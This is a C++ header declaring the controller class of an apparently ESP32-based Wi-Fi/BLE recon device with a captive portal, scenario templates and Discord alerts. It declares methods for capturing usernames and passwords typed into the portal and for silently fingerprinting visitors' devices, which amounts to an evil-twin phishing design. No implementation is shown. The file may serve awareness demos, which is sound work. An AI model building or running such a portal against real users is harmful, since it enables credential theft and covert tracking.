// App.h — orquestrador do dispositivo (facade de aplicação).
//
// Centraliza a lógica: validar autorização/modo/parâmetros, transicionar a
// máquina de estados, publicar eventos (espelhados no EventBus + Telemetria +
// Discord) e acionar módulos. As rotas HTTP e o console serial chamam estes
// métodos; nunca tocam periféricos diretamente (plano §4).
#pragma once

#include "ReconTypes.h"
#include "ble/BleScanner.h"
#include "core/EventBus.h"
#include "core/StateMachine.h"
#include "core/TaskScheduler.h"
#include "integrations/DiscordNotifier.h"
#include "network/AccessPoint.h"
#include "network/DnsPortal.h"
#include "network/ReconMonitor.h"
#include "network/WifiScanner.h"
#include "network/NetworkTools.h"
#include "security/Auth.h"
#include "security/RateLimiter.h"
#include "storage/Settings.h"
#include "storage/Telemetry.h"

namespace mak {

class WebServer;  // fwd (web/WebServer.h)

class App {
 public:
  App();

  bool begin();   // inicializa subsistemas e decide estado inicial
  void loop();    // laço cooperativo não bloqueante

  // --- Provisionamento (serial / fase admin) ---------------------------
  bool provisionOperatorPassword(const char* pw);
  bool provisionDiscordWebhook(const char* url);
  bool provisionUplink(const char* ssid, const char* pw);
  void setDiscordEnabled(bool en);

  // Configura o SSID do AP (salva na NVS e agenda reboot para aplicar) e o
  // template do portal (allowlist; aplica imediatamente, sem reboot).
  bool setApSsid(const char* ssid);
  bool setPortalTemplate(const char* id);

  // Sobe AP + DNS + HTTP se as credenciais existirem. Transiciona estados.
  bool startNetwork();

  // --- Ações de alto nível (chamadas pelas rotas/console) --------------
  bool startScenario(const char* id);     // valida allowlist + modo
  bool stopAll(const char* reason);        // STOP global: encerra, preserva resultados
  bool activateReveal();
  bool endReveal();                        // volta ao PORTAL_READY
  bool recordPortalSimulation(const char* provider);
  bool recordDemoInteraction();            // /portal/submit (booleano)
  bool runWifiScan(WifiScanSummary& out);
  bool runBleScan(BleScanSummary& out);
  bool connectUplink();                    // sobe STA de telemetria
  void disconnectUplink();
  void forgetUplink();                     // desconecta e apaga credencial salva
  void wipeTelemetry();

  // --- Ferramentas de recon ao vivo (console estilo ArmyKnife) ---------
  size_t reconScan();                      // APs + clientes conectados
  void reconSniff(bool on);                // liga/desliga sniffer de probes
  // Captura real do portal (visível no painel; exportável pelo operador).
  // sid: id de sessão do navegador para associar ao fingerprint (pode ser "").
  // ip: IP do cliente no SoftAP (remoteIP da requisição; pode ser "").
  bool captureCredential(const char* user, const char* pass, const char* sid,
                         const char* ip);
  // Fingerprint do aparelho coletado pelo portal (silencioso; só operador vê).
  bool captureDeviceInfo(const DeviceInfo& in);
  // Fingerprint associado a um id de sessão (nullptr se não houver).
  const DeviceInfo* deviceBySid(const char* sid) const;
  void wipeLiveData();                     // apaga recon/probes/dns/capturas

  // --- Acessores dos feeds ao vivo -------------------------------------
  ReconMonitor& recon() { return recon_; }
  NetworkTools& networkTools() { return networkTools_; }
  DnsPortal& dns() { return dns_; }
  size_t captureCount() const { return captureCount_; }
  const Capture* captureAt(size_t i) const {
    return i < captureCount_ ? &captures_[i] : nullptr;
  }
  size_t deviceCount() const { return deviceCount_; }
  const DeviceInfo* deviceAt(size_t i) const {
    return i < deviceCount_ ? &devices_[i] : nullptr;
  }
  // Detalhamento BLE (anúncios observados, sem endereço).
  size_t bleCount() const { return ble_.advCount(); }
  const BleAdv* bleAt(size_t i) const { return ble_.advAt(i); }

  // --- Acessores (somente leitura para a API/console) ------------------
  StateMachine& state() { return state_; }
  EventBus& events() { return events_; }
  const Telemetry& telemetry() const { return telemetry_; }
  Auth& auth() { return auth_; }
  RateLimiter& adminRate() { return adminRate_; }
  Settings& settings() { return settings_; }
  AccessPoint& ap() { return ap_; }
  DiscordNotifier& discord() { return discord_; }
  const char* currentScenario() const { return currentScenario_; }

 private:
  // Publica um evento no bus, atualiza telemetria e espelha no Discord.
  void publish(EventType type, bool flag, uint16_t count, const char* scenarioId);
  void enterErrorSafe(const char* why);

  Settings settings_;
  StateMachine state_;
  EventBus events_;
  Telemetry telemetry_;
  Auth auth_;
  RateLimiter adminRate_;
  TaskScheduler scheduler_;

  AccessPoint ap_;
  DnsPortal dns_;
  WifiScanner wifi_;
  BleScanner ble_;
  ReconMonitor recon_;
  NetworkTools networkTools_;
  DiscordNotifier discord_;

  // Capturas do portal (RAM, efêmeras).
  Capture captures_[cfg::kCaptureRingCap];
  size_t captureCount_ = 0;
  DeviceInfo devices_[cfg::kDeviceInfoRingCap];
  size_t deviceCount_ = 0;

  WebServer* web_ = nullptr;  // alocado em begin() (depende de Arduino)

  char currentScenario_[cfg::kScenarioIdMaxLen] = {0};
  uint32_t demoStartedMs_ = 0;
  uint32_t demoAutoStopMs_ = 0;
  bool reconnectUplink_ = false;
  bool rebootPending_ = false;
  uint32_t rebootAtMs_ = 0;
};

}  // namespace mak
